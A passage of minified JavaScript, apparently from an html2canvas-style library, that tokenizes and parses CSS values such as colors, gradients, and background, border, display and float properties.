48<=e&&e<=57},oe=function(e){return ae(e)||65<=e&&e<=70||97<=e&&e<=102},se=function(e){return 10===e||9===e||32===e},le=function(e){return 97<=(r=t=e)&&r<=122||65<=(n=t)&&n<=90||128<=e||95===e;var t,n,r},ce=function(e){return le(e)||ae(e)||45===e},ue=function(e,t){return 92===e&&10!==t},de=function(e,t,n){return 45===e?le(t)||ue(t,n):!!le(e)||!(92!==e||!ue(e,t))},pe=function(e,t,n){return 43===e||45===e?!!ae(t)||46===t&&ae(n):ae(46===e?t:e)},he={type:2},fe={type:3},Ae={type:4},me={type:13},ve={type:8},ge={type:21},ye={type:9},be={type:10},_e={type:11},we={type:12},Ce={type:14},xe={type:23},Se={type:1},ke={type:25},Me={type:24},Be={type:26},Ee={type:27},Te={type:28},Pe={type:29},Ie={type:31},Fe={type:32},Le=function(){function e(){this._value=[]}return e.prototype.write=function(e){this._value=this._value.concat(s(e))},e.prototype.read=function(){for(var e=[],t=this.consumeToken();t!==Fe;)e.push(t),t=this.consumeToken();return e},e.prototype.consumeToken=function(){var e=this.consumeCodePoint();switch(e){case 34:return this.consumeStringToken(34);case 35:var t=this.peekCodePoint(0),n=this.peekCodePoint(1),r=this.peekCodePoint(2);if(ce(t)||ue(n,r)){var i=de(t,n,r)?2:1;return{type:5,value:this.consumeName(),flags:i}}break;case 36:if(61===this.peekCodePoint(0))return this.consumeCodePoint(),me;break;case 39:return this.consumeStringToken(39);case 40:return he;case 41:return fe;case 42:if(61===this.peekCodePoint(0))return this.consumeCodePoint(),Ce;break;case 43:if(pe(e,this.peekCodePoint(0),this.peekCodePoint(1)))return this.reconsumeCodePoint(e),this.consumeNumericToken();break;case 44:return Ae;case 45:var a=e,o=this.peekCodePoint(0),s=this.peekCodePoint(1);if(pe(a,o,s))return this.reconsumeCodePoint(e),this.consumeNumericToken();if(de(a,o,s))return this.reconsumeCodePoint(e),this.consumeIdentLikeToken();if(45===o&&62===s)return this.consumeCodePoint(),this.consumeCodePoint(),Me;break;case 46:if(pe(e,this.peekCodePoint(0),this.peekCodePoint(1)))return this.reconsumeCodePoint(e),this.consumeNumericToken();break;case 47:if(42===this.peekCodePoint(0))for(this.consumeCodePoint();;){var c=this.consumeCodePoint();if(42===c&&47===(c=this.consumeCodePoint()))return this.consumeToken();if(-1===c)return this.consumeToken()}break;case 58:return Be;case 59:return Ee;case 60:if(33===this.peekCodePoint(0)&&45===this.peekCodePoint(1)&&45===this.peekCodePoint(2))return this.consumeCodePoint(),this.consumeCodePoint(),ke;break;case 64:var u=this.peekCodePoint(0),d=this.peekCodePoint(1),p=this.peekCodePoint(2);if(de(u,d,p))return{type:7,value:this.consumeName()};break;case 91:return Te;case 92:if(ue(e,this.peekCodePoint(0)))return this.reconsumeCodePoint(e),this.consumeIdentLikeToken();break;case 93:return Pe;case 61:if(61===this.peekCodePoint(0))return this.consumeCodePoint(),ve;break;case 123:return _e;case 125:return we;case 117:case 85:var h=this.peekCodePoint(0),f=this.peekCodePoint(1);return 43!==h||!oe(f)&&63!==f||(this.consumeCodePoint(),this.consumeUnicodeRangeToken()),this.reconsumeCodePoint(e),this.consumeIdentLikeToken();case 124:if(61===this.peekCodePoint(0))return this.consumeCodePoint(),ye;if(124===this.peekCodePoint(0))return this.consumeCodePoint(),ge;break;case 126:if(61===this.peekCodePoint(0))return this.consumeCodePoint(),be;break;case-1:return Fe}return se(e)?(this.consumeWhiteSpace(),Ie):ae(e)?(this.reconsumeCodePoint(e),this.consumeNumericToken()):le(e)?(this.reconsumeCodePoint(e),this.consumeIdentLikeToken()):{type:6,value:l(e)}},e.prototype.consumeCodePoint=function(){var e=this._value.shift();return void 0===e?-1:e},e.prototype.reconsumeCodePoint=function(e){this._value.unshift(e)},e.prototype.peekCodePoint=function(e){return e>=this._value.length?-1:this._value[e]},e.prototype.consumeUnicodeRangeToken=function(){for(var e=[],t=this.consumeCodePoint();oe(t)&&e.length<6;)e.push(t),t=this.consumeCodePoint();for(var n=!1;63===t&&e.length<6;)e.push(t),t=this.consumeCodePoint(),n=!0;if(n)return{type:30,start:parseInt(l.apply(void 0,e.map((function(e){return 63===e?48:e}))),16),end:parseInt(l.apply(void 0,e.map((function(e){return 63===e?70:e}))),16)};var r=parseInt(l.apply(void 0,e),16);if(45===this.peekCodePoint(0)&&oe(this.peekCodePoint(1))){this.consumeCodePoint(),t=this.consumeCodePoint();for(var i=[];oe(t)&&i.length<6;)i.push(t),t=this.consumeCodePoint();return{type:30,start:r,end:parseInt(l.apply(void 0,i),16)}}return{type:30,start:r,end:r}},e.prototype.consumeIdentLikeToken=function(){var e=this.consumeName();return"url"===e.toLowerCase()&&40===this.peekCodePoint(0)?(this.consumeCodePoint(),this.consumeUrlToken()):40===this.peekCodePoint(0)?(this.consumeCodePoint(),{type:19,value:e}):{type:20,value:e}},e.prototype.consumeUrlToken=function(){var e=[];if(this.consumeWhiteSpace(),-1===this.peekCodePoint(0))return{type:22,value:""};var t,n=this.peekCodePoint(0);if(39===n||34===n){var r=this.consumeStringToken(this.consumeCodePoint());return 0===r.type&&(this.consumeWhiteSpace(),-1===this.peekCodePoint(0)||41===this.peekCodePoint(0))?(this.consumeCodePoint(),{type:22,value:r.value}):(this.consumeBadUrlRemnants(),xe)}for(;;){var i=this.consumeCodePoint();if(-1===i||41===i)return{type:22,value:l.apply(void 0,e)};if(se(i))return this.consumeWhiteSpace(),-1===this.peekCodePoint(0)||41===this.peekCodePoint(0)?(this.consumeCodePoint(),{type:22,value:l.apply(void 0,e)}):(this.consumeBadUrlRemnants(),xe);if(34===i||39===i||40===i||0<=(t=i)&&t<=8||11===t||14<=t&&t<=31||127===t)return this.consumeBadUrlRemnants(),xe;if(92===i){if(!ue(i,this.peekCodePoint(0)))return this.consumeBadUrlRemnants(),xe;e.push(this.consumeEscapedCodePoint())}else e.push(i)}},e.prototype.consumeWhiteSpace=function(){for(;se(this.peekCodePoint(0));)this.consumeCodePoint()},e.prototype.consumeBadUrlRemnants=function(){for(;;){var e=this.consumeCodePoint();if(41===e||-1===e)return;ue(e,this.peekCodePoint(0))&&this.consumeEscapedCodePoint()}},e.prototype.consumeStringSlice=function(e){for(var t="";0<e;){var n=Math.min(6e4,e);t+=l.apply(void 0,this._value.splice(0,n)),e-=n}return this._value.shift(),t},e.prototype.consumeStringToken=function(e){for(var t="",n=0;;){var r=this._value[n];if(-1===r||void 0===r||r===e)return{type:0,value:t+=this.consumeStringSlice(n)};if(10===r)return this._value.splice(0,n),Se;if(92===r){var i=this._value[n+1];-1!==i&&void 0!==i&&(10===i?(t+=this.consumeStringSlice(n),n=-1,this._value.shift()):ue(r,i)&&(t+=this.consumeStringSlice(n),t+=l(this.consumeEscapedCodePoint()),n=-1))}n++}},e.prototype.consumeNumber=function(){var e=[],t=4,n=this.peekCodePoint(0);for(43!==n&&45!==n||e.push(this.consumeCodePoint());ae(this.peekCodePoint(0));)e.push(this.consumeCodePoint());n=this.peekCodePoint(0);var r=this.peekCodePoint(1);if(46===n&&ae(r))for(e.push(this.consumeCodePoint(),this.consumeCodePoint()),t=8;ae(this.peekCodePoint(0));)e.push(this.consumeCodePoint());n=this.peekCodePoint(0),r=this.peekCodePoint(1);var i=this.peekCodePoint(2);if((69===n||101===n)&&((43===r||45===r)&&ae(i)||ae(r)))for(e.push(this.consumeCodePoint(),this.consumeCodePoint()),t=8;ae(this.peekCodePoint(0));)e.push(this.consumeCodePoint());return[function(e){var t=0,n=1;43!==e[t]&&45!==e[t]||(45===e[t]&&(n=-1),t++);for(var r=[];ae(e[t]);)r.push(e[t++]);var i=r.length?parseInt(l.apply(void 0,r),10):0;46===e[t]&&t++;for(var a=[];ae(e[t]);)a.push(e[t++]);var o=a.length,s=o?parseInt(l.apply(void 0,a),10):0;69!==e[t]&&101!==e[t]||t++;var c=1;43!==e[t]&&45!==e[t]||(45===e[t]&&(c=-1),t++);for(var u=[];ae(e[t]);)u.push(e[t++]);var d=u.length?parseInt(l.apply(void 0,u),10):0;return n*(i+s*Math.pow(10,-o))*Math.pow(10,c*d)}(e),t]},e.prototype.consumeNumericToken=function(){var e=this.consumeNumber(),t=e[0],n=e[1],r=this.peekCodePoint(0),i=this.peekCodePoint(1),a=this.peekCodePoint(2);return de(r,i,a)?{type:15,number:t,flags:n,unit:this.consumeName()}:37===r?(this.consumeCodePoint(),{type:16,number:t,flags:n}):{type:17,number:t,flags:n}},e.prototype.consumeEscapedCodePoint=function(){var e,t=this.consumeCodePoint();if(oe(t)){for(var n=l(t);oe(this.peekCodePoint(0))&&n.length<6;)n+=l(this.consumeCodePoint());se(this.peekCodePoint(0))&&this.consumeCodePoint();var r=parseInt(n,16);return 0===r||55296<=(e=r)&&e<=57343||1114111<r?65533:r}return-1===t?65533:t},e.prototype.consumeName=function(){for(var e="";;){var t=this.consumeCodePoint();if(ce(t))e+=l(t);else{if(!ue(t,this.peekCodePoint(0)))return this.reconsumeCodePoint(t),e;e+=l(this.consumeEscapedCodePoint())}}},e}(),Oe=function(){function e(e){this._tokens=e}return e.create=function(t){var n=new Le;return n.write(t),new e(n.read())},e.parseValue=function(t){return e.create(t).parseComponentValue()},e.parseValues=function(t){return e.create(t).parseComponentValues()},e.prototype.parseComponentValue=function(){for(var e=this.consumeToken();31===e.type;)e=this.consumeToken();if(32===e.type)throw new SyntaxError("Error parsing CSS component value, unexpected EOF");this.reconsumeToken(e);for(var t=this.consumeComponentValue();31===(e=this.consumeToken()).type;);if(32===e.type)return t;throw new SyntaxError("Error parsing CSS component value, multiple values found when expecting only one")},e.prototype.parseComponentValues=function(){for(var e=[];;){var t=this.consumeComponentValue();if(32===t.type)return e;e.push(t),e.push()}},e.prototype.consumeComponentValue=function(){var e=this.consumeToken();switch(e.type){case 11:case 28:case 2:return this.consumeSimpleBlock(e.type);case 19:return this.consumeFunction(e)}return e},e.prototype.consumeSimpleBlock=function(e){for(var t={type:e,values:[]},n=this.consumeToken();;){if(32===n.type||Ve(n,e))return t;this.reconsumeToken(n),t.values.push(this.consumeComponentValue()),n=this.consumeToken()}},e.prototype.consumeFunction=function(e){for(var t={name:e.value,values:[],type:18};;){var n=this.consumeToken();if(32===n.type||3===n.type)return t;this.reconsumeToken(n),t.values.push(this.consumeComponentValue())}},e.prototype.consumeToken=function(){var e=this._tokens.shift();return void 0===e?Fe:e},e.prototype.reconsumeToken=function(e){this._tokens.unshift(e)},e}(),Ne=function(e){return 15===e.type},De=function(e){return 17===e.type},Re=function(e){return 20===e.type},je=function(e){return 0===e.type},Ue=function(e,t){return Re(e)&&e.value===t},$e=function(e){return 31!==e.type},ze=function(e){return 31!==e.type&&4!==e.type},He=function(e){var t=[],n=[];return e.forEach((function(e){if(4===e.type){if(0===n.length)throw new Error("Error parsing function args, zero tokens for arg");return t.push(n),void(n=[])}31!==e.type&&n.push(e)})),n.length&&t.push(n),t},Ve=function(e,t){return 11===t&&12===e.type||28===t&&29===e.type||2===t&&3===e.type},Qe=function(e){return 17===e.type||15===e.type},Ge=function(e){return 16===e.type||Qe(e)},We=function(e){return 1<e.length?[e[0],e[1]]:[e[0]]},Ke={type:17,number:0,flags:4},qe={type:16,number:50,flags:4},Xe={type:16,number:100,flags:4},Ye=function(e,t,n){var r=e[0],i=e[1];return[Je(r,t),Je(void 0!==i?i:r,n)]},Je=function(e,t){if(16===e.type)return e.number/100*t;if(Ne(e))switch(e.unit){case"rem":case"em":return 16*e.number;case"px":default:return e.number}return e.number},Ze=function(e,t){if(15===t.type)switch(t.unit){case"deg":return Math.PI*t.number/180;case"grad":return Math.PI/200*t.number;case"rad":return t.number;case"turn":return 2*Math.PI*t.number}throw new Error("Unsupported angle type")},et=function(e){return 15===e.type&&("deg"===e.unit||"grad"===e.unit||"rad"===e.unit||"turn"===e.unit)},tt=function(e){switch(e.filter(Re).map((function(e){return e.value})).join(" ")){case"to bottom right":case"to right bottom":case"left top":case"top left":return[Ke,Ke];case"to top":case"bottom":return nt(0);case"to bottom left":case"to left bottom":case"right top":case"top right":return[Ke,Xe];case"to right":case"left":return nt(90);case"to top left":case"to left top":case"right bottom":case"bottom right":return[Xe,Xe];case"to bottom":case"top":return nt(180);case"to top right":case"to right top":case"left bottom":case"bottom left":return[Xe,Ke];case"to left":case"right":return nt(270)}return 0},nt=function(e){return Math.PI*e/180},rt=function(e,t){if(18===t.type){var n=ht[t.name];if(void 0===n)throw new Error('Attempting to parse an unsupported color function "'+t.name+'"');return n(e,t.values)}if(5===t.type){if(3===t.value.length){var r=t.value.substring(0,1),i=t.value.substring(1,2),a=t.value.substring(2,3);return ot(parseInt(r+r,16),parseInt(i+i,16),parseInt(a+a,16),1)}if(4===t.value.length){r=t.value.substring(0,1),i=t.value.substring(1,2),a=t.value.substring(2,3);var o=t.value.substring(3,4);return ot(parseInt(r+r,16),parseInt(i+i,16),parseInt(a+a,16),parseInt(o+o,16)/255)}if(6===t.value.length)return r=t.value.substring(0,2),i=t.value.substring(2,4),a=t.value.substring(4,6),ot(parseInt(r,16),parseInt(i,16),parseInt(a,16),1);if(8===t.value.length)return r=t.value.substring(0,2),i=t.value.substring(2,4),a=t.value.substring(4,6),o=t.value.substring(6,8),ot(parseInt(r,16),parseInt(i,16),parseInt(a,16),parseInt(o,16)/255)}if(20===t.type){var s=At[t.value.toUpperCase()];if(void 0!==s)return s}return At.TRANSPARENT},it=function(e){return 0==(255&e)},at=function(e){var t=255&e,n=255&e>>8,r=255&e>>16,i=255&e>>24;return t<255?"rgba("+i+","+r+","+n+","+t/255+")":"rgb("+i+","+r+","+n+")"},ot=function(e,t,n,r){return(e<<24|t<<16|n<<8|Math.round(255*r)<<0)>>>0},st=function(e,t){if(17===e.type)return e.number;if(16!==e.type)return 0;var n=3===t?1:255;return 3===t?e.number/100*n:Math.round(e.number/100*n)},lt=function(e,t){var n=t.filter(ze);if(3===n.length){var r=n.map(st),i=r[0],a=r[1],o=r[2];return ot(i,a,o,1)}if(4!==n.length)return 0;var s=n.map(st),l=(i=s[0],a=s[1],o=s[2],s[3]);return ot(i,a,o,l)};function ct(e,t,n){return n<0&&(n+=1),1<=n&&(n-=1),n<1/6?(t-e)*n*6+e:n<.5?t:n<2/3?6*(t-e)*(2/3-n)+e:e}var ut,dt,pt=function(e,t){var n=t.filter(ze),r=n[0],i=n[1],a=n[2],o=n[3],s=(17===r.type?nt(r.number):Ze(0,r))/(2*Math.PI),l=Ge(i)?i.number/100:0,c=Ge(a)?a.number/100:0,u=void 0!==o&&Ge(o)?Je(o,1):1;if(0===l)return ot(255*c,255*c,255*c,1);var d=c<=.5?c*(l+1):c+l-c*l,p=2*c-d,h=ct(p,d,s+1/3),f=ct(p,d,s),A=ct(p,d,s-1/3);return ot(255*h,255*f,255*A,u)},ht={hsl:pt,hsla:pt,rgb:lt,rgba:lt},ft=function(e,t){return rt(e,Oe.create(t).parseComponentValue())},At={ALICEBLUE:4042850303,ANTIQUEWHITE:4209760255,AQUA:16777215,AQUAMARINE:2147472639,AZURE:4043309055,BEIGE:4126530815,BISQUE:4293182719,BLACK:255,BLANCHEDALMOND:4293643775,BLUE:65535,BLUEVIOLET:2318131967,BROWN:2771004159,BURLYWOOD:3736635391,CADETBLUE:1604231423,CHARTREUSE:2147418367,CHOCOLATE:3530104575,CORAL:4286533887,CORNFLOWERBLUE:1687547391,CORNSILK:4294499583,CRIMSON:3692313855,CYAN:16777215,DARKBLUE:35839,DARKCYAN:9145343,DARKGOLDENROD:3095837695,DARKGRAY:2846468607,DARKGREEN:6553855,DARKGREY:2846468607,DARKKHAKI:3182914559,DARKMAGENTA:2332068863,DARKOLIVEGREEN:1433087999,DARKORANGE:4287365375,DARKORCHID:2570243327,DARKRED:2332033279,DARKSALMON:3918953215,DARKSEAGREEN:2411499519,DARKSLATEBLUE:1211993087,DARKSLATEGRAY:793726975,DARKSLATEGREY:793726975,DARKTURQUOISE:13554175,DARKVIOLET:2483082239,DEEPPINK:4279538687,DEEPSKYBLUE:12582911,DIMGRAY:1768516095,DIMGREY:1768516095,DODGERBLUE:512819199,FIREBRICK:2988581631,FLORALWHITE:4294635775,FORESTGREEN:579543807,FUCHSIA:4278255615,GAINSBORO:3705462015,GHOSTWHITE:4177068031,GOLD:4292280575,GOLDENROD:3668254975,GRAY:2155905279,GREEN:8388863,GREENYELLOW:2919182335,GREY:2155905279,HONEYDEW:4043305215,HOTPINK:4285117695,INDIANRED:3445382399,INDIGO:1258324735,IVORY:4294963455,KHAKI:4041641215,LAVENDER:3873897215,LAVENDERBLUSH:4293981695,LAWNGREEN:2096890111,LEMONCHIFFON:4294626815,LIGHTBLUE:2916673279,LIGHTCORAL:4034953471,LIGHTCYAN:3774873599,LIGHTGOLDENRODYELLOW:4210742015,LIGHTGRAY:3553874943,LIGHTGREEN:2431553791,LIGHTGREY:3553874943,LIGHTPINK:4290167295,LIGHTSALMON:4288707327,LIGHTSEAGREEN:548580095,LIGHTSKYBLUE:2278488831,LIGHTSLATEGRAY:2005441023,LIGHTSLATEGREY:2005441023,LIGHTSTEELBLUE:2965692159,LIGHTYELLOW:4294959359,LIME:16711935,LIMEGREEN:852308735,LINEN:4210091775,MAGENTA:4278255615,MAROON:2147483903,MEDIUMAQUAMARINE:1724754687,MEDIUMBLUE:52735,MEDIUMORCHID:3126187007,MEDIUMPURPLE:2473647103,MEDIUMSEAGREEN:1018393087,MEDIUMSLATEBLUE:2070474495,MEDIUMSPRINGGREEN:16423679,MEDIUMTURQUOISE:1221709055,MEDIUMVIOLETRED:3340076543,MIDNIGHTBLUE:421097727,MINTCREAM:4127193855,MISTYROSE:4293190143,MOCCASIN:4293178879,NAVAJOWHITE:4292783615,NAVY:33023,OLDLACE:4260751103,OLIVE:2155872511,OLIVEDRAB:1804477439,ORANGE:4289003775,ORANGERED:4282712319,ORCHID:3664828159,PALEGOLDENROD:4008225535,PALEGREEN:2566625535,PALETURQUOISE:2951671551,PALEVIOLETRED:3681588223,PAPAYAWHIP:4293907967,PEACHPUFF:4292524543,PERU:3448061951,PINK:4290825215,PLUM:3718307327,POWDERBLUE:2967529215,PURPLE:2147516671,REBECCAPURPLE:1714657791,RED:4278190335,ROSYBROWN:3163525119,ROYALBLUE:1097458175,SADDLEBROWN:2336560127,SALMON:4202722047,SANDYBROWN:4104413439,SEAGREEN:780883967,SEASHELL:4294307583,SIENNA:2689740287,SILVER:3233857791,SKYBLUE:2278484991,SLATEBLUE:1784335871,SLATEGRAY:1887473919,SLATEGREY:1887473919,SNOW:4294638335,SPRINGGREEN:16744447,STEELBLUE:1182971135,TAN:3535047935,TEAL:8421631,THISTLE:3636451583,TOMATO:4284696575,TRANSPARENT:0,TURQUOISE:1088475391,VIOLET:4001558271,WHEAT:4125012991,WHITE:4294967295,WHITESMOKE:4126537215,YELLOW:4294902015,YELLOWGREEN:2597139199};(dt=ut||(ut={}))[dt.BORDER_BOX=0]="BORDER_BOX",dt[dt.PADDING_BOX=1]="PADDING_BOX";var mt,vt,gt,yt,bt,_t,wt={name:"background-clip",initialValue:"border-box",prefix:!(dt[dt.CONTENT_BOX=2]="CONTENT_BOX"),type:1,parse:function(e,t){return t.map((function(e){if(Re(e))switch(e.value){case"padding-box":return ut.PADDING_BOX;case"content-box":return ut.CONTENT_BOX}return ut.BORDER_BOX}))}},Ct={name:"background-color",initialValue:"transparent",prefix:!1,type:3,format:"color"},xt=function(e,t){var n=rt(e,t[0]),r=t[1];return r&&Ge(r)?{color:n,stop:r}:{color:n,stop:null}},St=function(e,t){var n=e[0],r=e[e.length-1];null===n.stop&&(n.stop=Ke),null===r.stop&&(r.stop=Xe);for(var i=[],a=0,o=0;o<e.length;o++){var s=e[o].stop;if(null!==s){var l=Je(s,t);a<l?i.push(l):i.push(a),a=l}else i.push(null)}var c=null;for(o=0;o<i.length;o++){var u=i[o];if(null===u)null===c&&(c=o);else if(null!==c){for(var d=o-c,p=(u-i[c-1])/(d+1),h=1;h<=d;h++)i[c+h-1]=p*h;c=null}}return e.map((function(e,n){return{color:e.color,stop:Math.max(Math.min(1,i[n]/t),0)}}))},kt=function(e,t){return Math.sqrt(e*e+t*t)},Mt=function(e,t,n,r,i){return[[0,0],[0,t],[e,0],[e,t]].reduce((function(e,t){var a=t[0],o=t[1],s=kt(n-a,r-o);return(i?s<e.optimumDistance:s>e.optimumDistance)?{optimumCorner:t,optimumDistance:s}:e}),{optimumDistance:i?1/0:-1/0,optimumCorner:null}).optimumCorner},Bt=function(e,t){var n=nt(180),r=[];return He(t).forEach((function(t,i){if(0===i){var a=t[0];if(20===a.type&&-1!==["top","left","right","bottom"].indexOf(a.value))return void(n=tt(t));if(et(a))return void(n=(Ze(0,a)+nt(270))%nt(360))}var o=xt(e,t);r.push(o)})),{angle:n,stops:r,type:mt.LINEAR_GRADIENT}},Et="closest-side",Tt="farthest-side",Pt="closest-corner",It="farthest-corner",Ft=function(e,t){var n=gt.CIRCLE,r=bt.FARTHEST_CORNER,i=[],a=[];return He(t).forEach((function(t,o){var s=!0;if(0===o?s=t.reduce((function(e,t){if(Re(t))switch(t.value){case"center":return a.push(qe),!1;case"top":case"left":return a.push(Ke),!1;case"right":case"bottom":return a.push(Xe),!1}else if(Ge(t)||Qe(t))return a.push(t),!1;return e}),s):1===o&&(s=t.reduce((function(e,t){if(Re(t))switch(t.value){case"circle":return n=gt.CIRCLE,!1;case"ellipse":return n=gt.ELLIPSE,!1;case"contain":case Et:return r=bt.CLOSEST_SIDE,!1;case Tt:return r=bt.FARTHEST_SIDE,!1;case Pt:return r=bt.CLOSEST_CORNER,!1;case"cover":case It:return r=bt.FARTHEST_CORNER,!1}else if(Qe(t)||Ge(t))return Array.isArray(r)||(r=[]),r.push(t),!1;return e}),s)),s){var l=xt(e,t);i.push(l)}})),{size:r,shape:n,stops:i,position:a,type:mt.RADIAL_GRADIENT}};(vt=mt||(mt={}))[vt.URL=0]="URL",vt[vt.LINEAR_GRADIENT=1]="LINEAR_GRADIENT",vt[vt.RADIAL_GRADIENT=2]="RADIAL_GRADIENT",(yt=gt||(gt={}))[yt.CIRCLE=0]="CIRCLE",yt[yt.ELLIPSE=1]="ELLIPSE",(_t=bt||(bt={}))[_t.CLOSEST_SIDE=0]="CLOSEST_SIDE",_t[_t.FARTHEST_SIDE=1]="FARTHEST_SIDE",_t[_t.CLOSEST_CORNER=2]="CLOSEST_CORNER",_t[_t.FARTHEST_CORNER=3]="FARTHEST_CORNER";var Lt,Ot,Nt=function(e,t){if(22===t.type){var n={url:t.value,type:mt.URL};return e.cache.addImage(t.value),n}if(18!==t.type)throw new Error("Unsupported image type "+t.type);var r=Dt[t.name];if(void 0===r)throw new Error('Attempting to parse an unsupported image function "'+t.name+'"');return r(e,t.values)},Dt={"linear-gradient":function(e,t){var n=nt(180),r=[];return He(t).forEach((function(t,i){if(0===i){var a=t[0];if(20===a.type&&"to"===a.value)return void(n=tt(t));if(et(a))return void(n=Ze(0,a))}var o=xt(e,t);r.push(o)})),{angle:n,stops:r,type:mt.LINEAR_GRADIENT}},"-moz-linear-gradient":Bt,"-ms-linear-gradient":Bt,"-o-linear-gradient":Bt,"-webkit-linear-gradient":Bt,"radial-gradient":function(e,t){var n=gt.CIRCLE,r=bt.FARTHEST_CORNER,i=[],a=[];return He(t).forEach((function(t,o){var s=!0;if(0===o){var l=!1;s=t.reduce((function(e,t){if(l)if(Re(t))switch(t.value){case"center":return a.push(qe),e;case"top":case"left":return a.push(Ke),e;case"right":case"bottom":return a.push(Xe),e}else(Ge(t)||Qe(t))&&a.push(t);else if(Re(t))switch(t.value){case"circle":return n=gt.CIRCLE,!1;case"ellipse":return n=gt.ELLIPSE,!1;case"at":return!(l=!0);case Et:return r=bt.CLOSEST_SIDE,!1;case"cover":case Tt:return r=bt.FARTHEST_SIDE,!1;case"contain":case Pt:return r=bt.CLOSEST_CORNER,!1;case It:return r=bt.FARTHEST_CORNER,!1}else if(Qe(t)||Ge(t))return Array.isArray(r)||(r=[]),r.push(t),!1;return e}),s)}if(s){var c=xt(e,t);i.push(c)}})),{size:r,shape:n,stops:i,position:a,type:mt.RADIAL_GRADIENT}},"-moz-radial-gradient":Ft,"-ms-radial-gradient":Ft,"-o-radial-gradient":Ft,"-webkit-radial-gradient":Ft,"-webkit-gradient":function(e,t){var n=nt(180),r=[],i=mt.LINEAR_GRADIENT,a=gt.CIRCLE,o=bt.FARTHEST_CORNER;return He(t).forEach((function(t,n){var a=t[0];if(0===n){if(Re(a)&&"linear"===a.value)return void(i=mt.LINEAR_GRADIENT);if(Re(a)&&"radial"===a.value)return void(i=mt.RADIAL_GRADIENT)}if(18===a.type)if("from"===a.name){var o=rt(e,a.values[0]);r.push({stop:Ke,color:o})}else if("to"===a.name)o=rt(e,a.values[0]),r.push({stop:Xe,color:o});else if("color-stop"===a.name){var s=a.values.filter(ze);if(2===s.length){o=rt(e,s[1]);var l=s[0];De(l)&&r.push({stop:{type:16,number:100*l.number,flags:l.flags},color:o})}}})),i===mt.LINEAR_GRADIENT?{angle:(n+nt(180))%nt(360),stops:r,type:i}:{size:o,shape:a,stops:r,position:[],type:i}}},Rt={name:"background-image",initialValue:"none",type:1,prefix:!1,parse:function(e,t){if(0===t.length)return[];var n=t[0];return 20===n.type&&"none"===n.value?[]:t.filter((function(e){return ze(e)&&!(20===(t=e).type&&"none"===t.value||18===t.type&&!Dt[t.name]);var t})).map((function(t){return Nt(e,t)}))}},jt={name:"background-origin",initialValue:"border-box",prefix:!1,type:1,parse:function(e,t){return t.map((function(e){if(Re(e))switch(e.value){case"padding-box":return 1;case"content-box":return 2}return 0}))}},Ut={name:"background-position",initialValue:"0% 0%",type:1,prefix:!1,parse:function(e,t){return He(t).map((function(e){return e.filter(Ge)})).map(We)}};(Ot=Lt||(Lt={}))[Ot.REPEAT=0]="REPEAT",Ot[Ot.NO_REPEAT=1]="NO_REPEAT",Ot[Ot.REPEAT_X=2]="REPEAT_X";var $t,zt,Ht={name:"background-repeat",initialValue:"repeat",prefix:!(Ot[Ot.REPEAT_Y=3]="REPEAT_Y"),type:1,parse:function(e,t){return He(t).map((function(e){return e.filter(Re).map((function(e){return e.value})).join(" ")})).map(Vt)}},Vt=function(e){switch(e){case"no-repeat":return Lt.NO_REPEAT;case"repeat-x":case"repeat no-repeat":return Lt.REPEAT_X;case"repeat-y":case"no-repeat repeat":return Lt.REPEAT_Y;case"repeat":default:return Lt.REPEAT}};(zt=$t||($t={})).AUTO="auto",zt.CONTAIN="contain";var Qt,Gt,Wt={name:"background-size",initialValue:"0",prefix:!(zt.COVER="cover"),type:1,parse:function(e,t){return He(t).map((function(e){return e.filter(Kt)}))}},Kt=function(e){return Re(e)||Ge(e)},qt=function(e){return{name:"border-"+e+"-color",initialValue:"transparent",prefix:!1,type:3,format:"color"}},Xt=qt("top"),Yt=qt("right"),Jt=qt("bottom"),Zt=qt("left"),en=function(e){return{name:"border-radius-"+e,initialValue:"0 0",prefix:!1,type:1,parse:function(e,t){return We(t.filter(Ge))}}},tn=en("top-left"),nn=en("top-right"),rn=en("bottom-right"),an=en("bottom-left");(Gt=Qt||(Qt={}))[Gt.NONE=0]="NONE",Gt[Gt.SOLID=1]="SOLID",Gt[Gt.DASHED=2]="DASHED",Gt[Gt.DOTTED=3]="DOTTED",Gt[Gt.DOUBLE=4]="DOUBLE";var on,sn,ln=function(e){return{name:"border-"+e+"-style",initialValue:"solid",prefix:!1,type:2,parse:function(e,t){switch(t){case"none":return Qt.NONE;case"dashed":return Qt.DASHED;case"dotted":return Qt.DOTTED;case"double":return Qt.DOUBLE}return Qt.SOLID}}},cn=ln("top"),un=ln("right"),dn=ln("bottom"),pn=ln("left"),hn=function(e){return{name:"border-"+e+"-width",initialValue:"0",type:0,prefix:!1,parse:function(e,t){return Ne(t)?t.number:0}}},fn=hn("top"),An=hn("right"),mn=hn("bottom"),vn=hn("left"),gn={name:"color",initialValue:"transparent",prefix:!1,type:3,format:"color"},yn={name:"direction",initialValue:"ltr",prefix:!1,type:2,parse:function(e,t){switch(t){case"rtl":return 1;case"ltr":default:return 0}}},bn={name:"display",initialValue:"inline-block",prefix:!1,type:1,parse:function(e,t){return t.filter(Re).reduce((function(e,t){return e|_n(t.value)}),0)}},_n=function(e){switch(e){case"block":case"-webkit-box":return 2;case"inline":return 4;case"run-in":return 8;case"flow":return 16;case"flow-root":return 32;case"table":return 64;case"flex":case"-webkit-flex":return 128;case"grid":case"-ms-grid":return 256;case"ruby":return 512;case"subgrid":return 1024;case"list-item":return 2048;case"table-row-group":return 4096;case"table-header-group":return 8192;case"table-footer-group":return 16384;case"table-row":return 32768;case"table-cell":return 65536;case"table-column-group":return 131072;case"table-column":return 262144;case"table-caption":return 524288;case"ruby-base":return 1048576;case"ruby-text":return 2097152;case"ruby-base-container":return 4194304;case"ruby-text-container":return 8388608;case"contents":return 16777216;case"inline-block":return 33554432;case"inline-list-item":return 67108864;case"inline-table":return 134217728;case"inline-flex":return 268435456;case"inline-grid":return 536870912}return 0};(sn=on||(on={}))[sn.NONE=0]="NONE",sn[sn.LEFT=1]="LEFT",sn[sn.RIGHT=2]="RIGHT",sn[sn.INLINE_START=3]="INLINE_START";var wn,Cn,xn,Sn,kn={name:"float",initialValue:"none",prefix:!(sn[sn.INLINE_END=4]="INLINE_END"),type:2,parse:function(e,t){switch(t){case"left":return on.LEFT;case"right":return on.RIGHT;case"inline-start":return on.INLINE_START;case"inline-end":return on.INLINE_END}return on.NONE}},Mn={name:"letter-spacing",initialValue:"0",prefix:!1,type:0,parse:function(e,t){return 